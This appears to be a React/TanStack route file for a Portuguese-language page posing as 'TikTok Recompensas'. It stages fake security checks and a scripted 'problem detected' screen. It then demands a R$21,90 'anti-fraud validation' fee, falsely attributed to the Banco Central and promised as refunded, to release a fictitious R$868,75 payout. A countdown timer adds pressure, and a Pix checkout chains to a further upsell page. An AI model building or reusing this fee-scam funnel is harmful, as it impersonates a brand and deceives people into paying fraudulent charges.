import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { trackEvent } from "@/lib/tracking";
import { PixCheckoutModal } from "@/components/PixCheckoutModal";


export const Route = createFileRoute("/upsell-2")({
  head: () => ({
    meta: [
      { title: "Validação de Segurança | TikTok Recompensas" },
      {
        name: "description",
        content:
          "Seu saque de R$868,75 exige uma validação antifraude obrigatória de R$21,90, reembolsada automaticamente.",
      },
      { property: "og:title", content: "Validação de Segurança | TikTok Recompensas" },
      {
        property: "og:description",
        content: "Validação antifraude obrigatória para liberar seu pagamento.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Upsell2,
});

const STEPS = [
  "Verificando dados da conta",
  "Validando informações pessoais",
  "Conectando ao sistema bancário",
  "Consultando o Banco Central",
];

function Upsell2() {
  const [phase, setPhase] = useState<"loading" | "issue" | "offer">("loading");
  const [done, setDone] = useState(0);
  const [left, setLeft] = useState(600);
  const [pixOpen, setPixOpen] = useState(false);

  useEffect(() => {
    trackEvent("ViewContent", { content_name: "Upsell 2", currency: "BRL", value: 21.9 });
  }, []);

  useEffect(() => {
    if (phase !== "loading") return;
    if (done >= STEPS.length) {
      const t = setTimeout(() => setPhase("issue"), 400);
      return () => clearTimeout(t);
    }
    const t = setTimeout(() => setDone((d) => d + 1), 450);
    return () => clearTimeout(t);
  }, [done, phase]);

  useEffect(() => {
    if (phase !== "issue") return;
    const t = setTimeout(() => setPhase("offer"), 1200);
    return () => clearTimeout(t);
  }, [phase]);

  useEffect(() => {
    if (phase !== "offer") return;
    const t = setInterval(() => setLeft((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, [phase]);

  const time = `${String(Math.floor(left / 60)).padStart(2, "0")}:${String(left % 60).padStart(2, "0")}`;

  return (
    <div className="min-h-screen bg-background">
      <header className="flex items-center justify-center border-b border-border py-4">
        <span className="text-xl font-bold tracking-tight text-foreground">TikTok</span>
      </header>

      <main className="mx-auto flex w-full max-w-md flex-col items-center px-4 py-16">
        {phase === "loading" && (
          <section className="w-full text-center">
            <div className="mx-auto h-12 w-12 animate-spin rounded-full border-4 border-muted border-t-rose-500" />
            <h1 className="mt-6 text-xl font-bold text-foreground">
              Verificando a segurança da transação
            </h1>
            <ul className="mx-auto mt-6 max-w-xs space-y-3 text-left">
              {STEPS.map((step, i) => (
                <li
                  key={step}
                  className={`flex items-center gap-3 text-sm ${
                    i < done ? "text-foreground" : "text-muted-foreground"
                  }`}
                >
                  <span className={i < done ? "text-emerald-600" : "text-muted-foreground"}>
                    {i < done ? "✓" : "○"}
                  </span>
                  {step}
                </li>
              ))}
            </ul>
          </section>
        )}

        {phase === "issue" && (
          <section className="w-full py-24 text-center">
            <h1 className="text-xl font-bold text-rose-600">Problema Detectado</h1>
            <p className="mt-3 text-sm text-muted-foreground">
              Identificamos um problema de segurança na sua transação.
            </p>
          </section>
        )}

        {phase === "offer" && (
          <section className="w-full">
            <h1 className="text-center text-2xl font-bold text-foreground">
              Validação de Segurança
            </h1>
            <p className="mt-3 text-center text-sm text-muted-foreground">
              Seu saque de <strong className="text-foreground">R$868,75</strong> exige uma
              verificação obrigatória
            </p>

            <div className="mt-6 rounded-xl bg-rose-50 p-4">
              <p className="flex items-center gap-2 text-sm font-bold text-rose-600">
                ⚠ Medida de Segurança Obrigatória
              </p>
              <p className="mt-2 text-sm text-muted-foreground">
                O <strong className="text-foreground">Banco Central</strong> exige a validação
                antifraude. A taxa de <strong className="text-foreground">R$21,90</strong> será
                reembolsada automaticamente.
              </p>
            </div>

            <div className="mt-5 rounded-xl bg-muted p-6 text-center">
              <p className="text-4xl font-extrabold text-rose-600">R$21,90</p>
              <p className="mt-2 text-sm text-muted-foreground">
                Reembolsado automaticamente em até 2 min
              </p>
              <button
                type="button"
                onClick={() => {
                  trackEvent("AddToCart", {
                    content_name: "Upsell 2",
                    currency: "BRL",
                    value: 21.9,
                  });
                  setPixOpen(true);
                }}
                className="mt-5 block w-full rounded-xl bg-background px-4 py-4 text-sm font-bold uppercase tracking-wide text-foreground shadow-sm transition-colors hover:bg-rose-600 hover:text-white"
              >
                Liberar meu pagamento agora
              </button>
              <PixCheckoutModal
                open={pixOpen}
                onClose={() => setPixOpen(false)}
                amount={21.9}
                title="Validação de Segurança"
                nextRoute="/upsell-3"
                prefillName="Cliente"
                prefillEmail={`cliente+up2${Date.now()}@email.com`}
              />

            </div>

            <p className="mt-5 text-center text-sm text-muted-foreground">
              ⏱ Validação disponível por:{" "}
              <span className="font-bold text-rose-600">{time}</span>
            </p>
          </section>
        )}
      </main>
    </div>
  );
}
